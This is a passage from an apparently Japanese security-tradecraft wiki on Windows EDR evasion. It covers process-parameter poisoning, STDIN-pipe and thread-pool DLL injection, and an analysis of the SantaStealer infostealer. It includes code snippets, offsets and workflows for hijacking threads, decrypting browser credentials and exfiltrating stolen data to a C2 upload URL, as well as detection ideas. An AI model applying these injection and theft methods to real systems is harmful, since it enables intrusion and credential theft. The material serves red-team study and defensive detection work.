- 大きな implant では、injector のソース内でバッファ全体を正しく表現できるよう、shellcode の埋め込みを文字列リテラルから **byte-array/braced initializer** に変更する必要があることが多い。

検出のアイデア
- よくある private RWX/RX allocation ではなく、**image-backed executable pages**（`MEM_IMAGE`、`PAGE_EXECUTE*`）へのリモート書き込み。
- メモリ上のバイト列がディスク上の backing file と一致しない export entry point。
- 最近先頭のバイト列が変更された正規 DLL export 内から実行を開始するリモートスレッドや context pivot。
- DLL `.text` page に対する不審な `VirtualProtect(Ex)` / `WriteProcessMemory` の呼び出しに続くスレッド作成。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) は、従来のリモート書き込み経路（`VirtualAllocEx` + `WriteProcessMemory`）を回避する **process-injection / EDR-evasion** technique です。すでに実行中のターゲットにバイト列をコピーする代わりに、Windows が選択された `CreateProcessW` の起動パラメーターを子プロセスに**コピーし**、`PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内に格納する仕組みを悪用します。<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` がコピーする、poison 可能な carrier

有用な carrier は次のとおりです。

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（`CREATE_UNICODE_ENVIRONMENT` を指定）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

実用上の carrier の制約：

- `lpCommandLine` は `CreateProcessW` のために **書き込み可能なメモリ** を指す必要があり、null terminator を含め **32,767 Unicode 文字** までに制限される。
- `lpEnvironment` は、連続した `NAME=VALUE\0` 文字列を追加の `\0` で終端した Unicode 環境ブロックでなければならない。
- `lpReserved` は公式には予約領域のため、`ShellInfo` へのマッピングは安定した文書化済みの仕様ではなく、実装上の詳細として扱うべきである。

これにより、通常のプロセス作成が **payload-transfer primitive** になります。攻撃者は制御下の起動データを使って子プロセスを作成し、Windows にプロセス間コピーを実行させます。

### リモート書き込み API を使わないリモート lookup の流れ

子プロセスの作成後、**read-only** の primitive を使ってコピーされたバッファを特定します。

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` を取得
2. リモートの `PEB` を読み取る
3. `PEB.ProcessParameters` をたどる
4. `RTL_USER_PROCESS_PARAMETERS` を読み取る
5. 選択したポインターを使用する：
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

最小限の流れ：

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### コピーされたパラメータバッファの実行

コピーされたパラメータ領域は通常 `RW` であり、実行可能ではありません。一般的な P3 chain は次のとおりです。

1. プロセスを通常どおり作成する（サスペンド状態にしない）
2. `NtProtectVirtualMemory` / `VirtualProtectEx` を使って、選択したパラメータページを実行可能にする
3. `PROCESS_INFORMATION` ですでに返されたメインスレッドのハンドルを再利用する
4. `NtSetContextThread`（`CONTEXT_CONTROL`、`RIP` を上書き）で実行をリダイレクトする

従来の thread hijacking のワークフローとは異なり、`SuspendThread` / `ResumeThread` は不要です。返されたメインスレッドのハンドルに対して、直接コンテキストを変更できます。

これにより、インジェクションで一般的に監視される複数の API を回避できます。

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 多くの場合、`SuspendThread` / `ResumeThread` も回避できます

### Null byte の制限と staged shellcode

3 つの carrier はすべて**文字列または文字列に類似したデータ**であるため、`0x00` を含む raw payload は転送時に切り詰められます。実用的な回避策は、実行時に定数を再構築してから任意の second stage を読み込む、**null-free の first stage** を使うことです。

シンプルなパターンとして、XOR ベースの定数合成があります。

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

これにより、第1ステージは、転送するパラメーターに null byte を埋め込まずに、スタック文字列、API 引数、DLL パス、または第2ステージの shellcode loader を構築できます。

### 第1ステージからのスタックベース API 呼び出し

第1ステージで `LoadLibraryA` などの API を呼び出す必要がある場合、次のようにできます。

- ターゲットのスタックに文字列/バッファを push する
- **32-byte x64 shadow space** を確保する
- `RCX`、`RDX`、`R8`、`R9` に定数または `RSP` 相対ポインターを設定する
- 呼び出しの前に `RSP` を **16-byte 境界にアライン**させる

その後、第2ステージをスタックから `PAGE_READWRITE` の割り当て領域にコピーし、`VirtualProtect` で `PAGE_EXECUTE_READ` に変更してからジャンプできます。これにより、直接の RWX 割り当てを回避できます。

### 検知のアイデア

著者が挙げている有効な調査ポイントは次のとおりです。

- `VirtualProtectEx` / `NtProtectVirtualMemory` によって**プロセスパラメーターのページが実行可能になる**
- その保護属性の変更に続く `SetThreadContext` / `NtSetContextThread`
- `PEB`、続いて `RTL_USER_PROCESS_PARAMETERS` のリモート読み取り
- プロセス作成時の、通常より長い、またはエントロピーの高い `lpCommandLine`、`lpEnvironment`、`STARTUPINFO.lpReserved` の値

### メモ

- P3 は**プロセス間転送の手法**であり、それ自体は完全な実行プリミティブではありません。コピーされたパラメーターには、実行権限への変更と実行先のリダイレクト方法が別途必要です。
- 著者は `RtlCreateProcessReflection` / Dirty Vanity も検討しましたが、内部で `NtWriteVirtualMemory` や `NtCreateThreadEx` などの疑わしいプリミティブを使うため、採用しませんでした。

## Console STDIN pipe injection

対話型コンソールの子プロセスも、**payload 転送プリミティブ**として利用できます。injector は子プロセスの標準入力をパイプにリダイレクトし、マーカーに続けて shellcode を送信します。コンソールプログラムがデータを自身のプライベートメモリに読み込んだ後、injector はそのバッファーを見つけて実行可能にし、子スレッドの実行先をそこにリダイレクトします。この方法では `VirtualAllocEx` と `WriteProcessMemory` を回避できますが、一般的な EDR bypass ではなく、依然としてプロセスインジェクションです。<sup>[[41]](#references)</sup>

「named-pipe」という説明に反して、参照実装が呼び出すのは `CreatePipe` であり、これは**匿名パイプ**を作成します。Windows は匿名パイプを内部で一意の名前を持つパイプオブジェクトとして実装しますが、この PoC は `\\.\pipe\<name>` パスを選択せず、`CreateNamedPipe` も呼び出しません。既定のセキュリティ記述子で継承可能なハンドルを作成し、読み取りハンドルを `STARTUPINFO.hStdInput` に設定し、`STARTF_USESTDHANDLES` を指定して、ハンドル継承を有効にした新しい子プロセスを起動します。したがって、この PoC は指定されたコンソール実行ファイルを起動するものであり、既存のプロセスにパイプを接続するものではありません。<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### 参照ワークフロー

実装では、次の手順を使用します。<sup>[[41]](#references)</sup>

1. 子プロセスの `STDIN` と `STDOUT` 用に、匿名パイプのペアを作成します。親側の2つのハンドルの継承を無効にし、プロセス作成後に子側の複製ハンドルを親プロセスで閉じます。
2. `CREATE_NEW_CONSOLE` を指定して、`netsh.exe` や `nslookup.exe` などの対話型実行ファイルを起動します。子プロセスはリダイレクトされた標準ハンドルを継承します。
3. 親側の `STDIN` ハンドルを介して、完全なバイナリの `rawData` 配列を `WriteFile` で送信します。コンソールプログラムはバイト列を読み込み、そのコピーを自身のプライベートなコミット済み領域のいずれかに残します。
4. `VirtualQueryEx` で子プロセスのアドレス空間を調べ、`ReadProcessMemory` で候補となる `MEM_PRIVATE` 領域を読み取り、`rawData` の先頭にあるマーカーを検索します。
5. `VirtualProtectEx` で、見つかったバッファーを `PAGE_EXECUTE_READWRITE` に変更します。
6. メインスレッドを特定して中断し、`NtSetContextThread` で `RIP` を `found_address + 0x19` に設定してから再開します。

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

提供された実装はx64専用です。`CONTEXT.Rip`を変更し、埋め込みペイロードはx64 shellcodeです。`rawData`は25バイトのマーカーで始まるため、実行可能なバイト列は16進オフセット`0x19`から始まります。ペイロードを置き換える場合は、このレイアウトを維持するか、マーカー、検索ベクトル、配列サイズ、実行オフセットをまとめて更新してください。ソースコメントでは、`0x0A`、`0x0D`、`0x1A`もbad characterとして挙げられています。このワークフローでは、子プロセスのtokenや権限は変更されません。<sup>[[41]](#references)</sup>

小規模なネイティブヘルパーとペイロードのコンパイルパターンについては、[Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md)を参照してください。

## shellcodeを使わないthread-pool callback DLL injection (DLLParty)

DLLPartyはPoolPartyスタイルのthread-pool injectionを応用し、注入したcallback stubを実行する代わりに、既存のtarget workerに`LoadLibraryA`を呼び出させます。dispatch primitiveには、target poolのI/O completion portにキューイングする`TP_DIRECT` completionを使用します。これはprocess permissionsを回避するものではありません。PoCは`OpenProcess(PROCESS_ALL_ACCESS)`を呼び出し、読み書き可能なtarget memoryと、複製可能なworker-factoryおよびcompletion-port handleを必要とします。<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64では、workerはstack上にある`TP_CALLBACK_INSTANCE`へのポインターを、最初のcallback引数として`RCX`に渡します。`LoadLibraryA`は、同じポインターを`LPCSTR`として解釈します。テストした経路では、`TppWorkerThread`が`RSP+0x178`にポインターを設定し、そのオブジェクトへの最初の通常の書き込みは`RSP+0x1d0`で行われます。そのため、0x58バイトの先頭部分に収まるnull終端DLLパスであれば、dispatch前に上書きされずにインスタンスの先頭に配置できます。これは特定のbuildで確認された挙動であり、文書化されたWindows ABIの保証ではありません。<sup>[[46]](#references)[[47]](#references)</sup>

参考ワークフローは次のとおりです。<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)`でtargetのhandleを列挙し、object typeを照会して`TpWorkerFactory`を特定します。worker-factory handleを複製し、`WorkerFactoryBasicInformation`を照会します。`StartParameter`からremote `TP_POOL`を取得できます。`TotalWorkerCount == 0`のfactoryはスキップします。
2. `TP_POOL.CompletionPort`を読み取り、poolのprivate worker listをたどります。テストしたWindows 10 19045 x64 build（`ntdll.dll 10.0.19041.4842`）では、headは`pool+0x60`にあり、各linkは`worker+0x10`にあります。そのため、callback-instance slotの`worker+0x38`は`link+0x28`と一致します。PoCは、ポインターのalignment、linkの相互参照、poolの所有関係、ゼロ以外のthread ID、ノードの重複、list headの安定性を検証します。
3. キューイングしたcompletionはどのworkerにも処理される可能性があるため、見つかった**すべての**worker slotにDLLパスを書き込みます。書き込み可能なtarget memoryに、`Callback = LoadLibraryA`となる`TP_DIRECT`を配置します。PoCは`VirtualAllocEx`の代わりにworker stack上の`last_slot-0x500`を使います。このオフセットは実験的なもので、使用中のstack dataと衝突しないようにする必要があります。
4. targetのcompletion-port handleを複製し、`ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`を呼び出します。remote `TP_DIRECT`のアドレスがcompletion keyになります。既存のworkerが、上書きされたcallback-instanceポインターを使って`LoadLibraryA`を呼び出し、targetからアクセス可能なDLLを読み込みます。

PoCはtarget PID（`DLLParty.exe <target_pid>`）を受け取り、`DLLParty.cpp`内にハードコードされたDLLパスを使用します。build前に、targetからアクセス可能なパスを設定し、x64 executableをビルドしてください。また、自プロセスの`LoadLibraryA`アドレスをremote callbackとして使うため、そのアドレスがtargetでも有効であることを前提としています。このコードは、パス長が0x58バイトの領域に収まるか、worker traversalでslotが見つかったうえで最後の要素を参照しているかを確認しません。target buildに合わせて、private offset、stack layout、書き込み可能な領域を再検証してください。`CreateRemoteThreadEx`、shellcode、`VirtualAllocEx`を使わなくても、プロセス間の書き込みやDLL読み込みのtelemetryはなくなりません。<sup>[[46]](#references)[[47]](#references)</sup>

## Fileless evasionとcredential theftのためのSantaStealer tradecraft

SantaStealer（別名BluelineStealer）は、現代のinfo-stealerがAV bypass、anti-analysis、credential accessを単一のワークフローに組み合わせる方法を示しています。<sup>[[24]](#references)</sup>

### Keyboard layoutによる実行制限とsandbox遅延

- config flag（`anti_cis`）は`GetKeyboardLayoutList`でインストール済みのkeyboard layoutを列挙します。Cyrillic layoutが見つかると、サンプルは空の`CIS` markerを作成してから終了します。これにより、除外対象のlocaleではstealerを実行せず、調査に役立つ痕跡を残します。

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### 多層化された `check_antivm` ロジック

- Variant A はプロセスリストを走査し、各名前を独自のローリングチェックサムでハッシュ化して、デバッガー／sandbox 用の埋め込みブロックリストと照合します。コンピューター名にも同じチェックサム処理を行い、`C:\analysis` などの作業ディレクトリも確認します。
- Variant B はシステムのプロパティ（プロセス数の下限、最近の起動時間）を調べ、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox additions を検出し、sleep の前後でタイミングチェックを行って single-stepping を見つけます。いずれかに該当すると、モジュールの起動前に処理を中断します。

### Fileless helper と二重 ChaCha20 による reflective loading

- メインの DLL/EXE には Chromium の credential helper が埋め込まれており、ディスクに書き出すか、メモリ上に手動で map します。fileless モードでは helper の痕跡を一切書き込まないよう、import/relocation を自ら解決します。
- この helper は第2段階の DLL を、ChaCha20 で二重に暗号化して保持します（32バイトの key が2つ、12バイトの nonce が2つ）。2回復号した後、blob を reflective loading し（`LoadLibrary` は使用せず）、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来する export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` を呼び出します。<sup>[[25]](#references)</sup>
- ChromElevator のルーチンは、direct-syscall による reflective process hollowing を使って稼働中の Chromium browser に inject し、AppBound Encryption の key を継承します。その後、ABE の hardening にもかかわらず、SQLite database から password/cookie/credit card を直接復号します。

### モジュール式のメモリ内収集と分割 HTTP exfil

- `create_memory_based_log` はグローバルな `memory_generators` function-pointer table を反復し、有効なモジュール（Telegram、Discord、Steam、screenshots、documents、browser extensions など）ごとにスレッドを1つ起動します。各スレッドは共有 buffer に結果を書き込み、約45秒の join window 後にファイル数を報告します。
- 完了後、静的リンクされた `miniz` library で全データを `%TEMP%\\Log.zip` に圧縮します。次に `ThreadPayload1` は15秒 sleep し、HTTP POST で archive を10 MB単位に分割して `http://<C2>:6767/upload` に送信します。browser の `multipart/form-data` boundary（`----WebKitFormBoundary***`）を偽装します。各 chunk には `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` が付加され、最後の chunk には C2 が再構築の完了を把握できるよう `complete: true` が追加されます。

## References

- [1] [Advanced Evasion Tradecraft: 高精度な Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – ブログ](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack：マルウェアにもう「無料パス」は与えない](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – ドキュメント](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – サンプル](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – サンプル](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer の新たな感染チェーンと ConfuserEx ベースの難読化](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – 自社の zero trust を信頼すべきか？Zscaler posture check の bypass](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell 以前：Storm-2603 の過去の ransomware 活動を探る](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading：転送された export の悪用](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library の検索順序](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process の security と access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU リファレンス (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) を活用して EDR に対抗する](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect 技法で Windows Defender の保護シェルを破る](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink コマンドのリファレンス](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain の裏側：RAT から builder、coder まで](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer が街にやってくる：野心的な新型 Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader：API tracing で Node.js malware を打ち破る](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty：Crystal Palace で Adaptix を眠らせる](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II：CFG、CET、Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW を隠す](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team の作戦で Chrome Remote Desktop を悪用する：実践ガイド](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged：Defender の Remediation Driver を kernel operation primitive として weaponize する](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo の補助コード](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo：LLVM を使った自己マスキング関数の作成](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole のソース](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe 関数](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - リダイレクトされた入力と出力を使った子プロセスの作成](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy：WasmForge で C# ツールを再構築する](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - C# / .NET project のコンパイル](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept とソース](https://github.com/epersic/DLLParty)
- [47] [DLLParty — shellcodeless DLL injection のために thread pool internals を悪用する](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset と thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [EMBER2024 を使った red team implant の評価](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Machine Learning ベースの検知を回避する](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML ベースの .NET loading framework](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan method](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
